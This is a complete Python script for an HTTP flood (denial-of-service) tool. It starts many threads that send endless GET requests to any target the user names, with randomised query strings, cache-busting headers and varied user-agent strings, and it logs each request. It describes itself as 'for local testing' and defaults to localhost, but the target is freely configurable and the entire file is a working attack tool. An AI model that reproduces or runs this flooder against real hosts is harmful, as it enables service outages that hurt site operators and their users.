import http.client
import urllib.parse
import threading
import time
import random
import string
from argparse import ArgumentParser
import logging
import os
import pandas as pd

os.makedirs("logs", exist_ok=True)
logging.basicConfig(filename='logs/access.log', level=logging.INFO, format='%(asctime)s - %(message)s')

def random_string(length):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

class Requester(threading.Thread):
    def __init__(self, target, port=5000):
        threading.Thread.__init__(self)
        self.target = target
        self.port = port
        self.lock = threading.Lock()

    def run(self):
        try:
            while True:
                conn = http.client.HTTPConnection(self.target, self.port)
                url = f"/?{random_string(10)}"
                headers = {
                    'User-Agent': f'Mozilla/5.0 (TestAgent/{random.randint(1,100)})',
                    'Cache-Control': 'no-cache',
                    'Accept-Encoding': 'gzip'
                }
                conn.request("GET", url, None, headers)
                with self.lock:
                    global req_count
                    req_count += 1
                    print(f"[+] Sent {req_count} requests")
                timestamp = pd.Timestamp.now().isoformat()
                logging.info(f'IP: {self.target}, URL: {url}, Time: {timestamp}')
                conn.close()
                time.sleep(0.0001)
        except Exception as e:
            print(f"[-] Error: {e}")
        except KeyboardInterrupt:
            print("[-] Stopped by user")

req_count = 0

def main():
    parser = ArgumentParser(description="Simple HTTP flood for local testing")
    parser.add_argument('-d', '--target', default='127.0.0.1', help='Target IP or domain (default: 127.0.0.1)')
    parser.add_argument('-p', '--port', type=int, default=5000, help='Target port (default: 5000)')
    parser.add_argument('-t', '--threads', type=int, default=50, help='Number of threads (default: 50)')
    args = parser.parse_args()

    print(f"[*] Starting HTTP flood on {args.target}:{args.port} with {args.threads} threads")
    threads = []
    for _ in range(args.threads):
        t = Requester(args.target, args.port)
        t.daemon = True
        t.start()
        threads.append(t)
    
    try:
        for t in threads:
            t.join()
    except KeyboardInterrupt:
        print("[-] Stopped by user")

if __name__ == '__main__':
    main()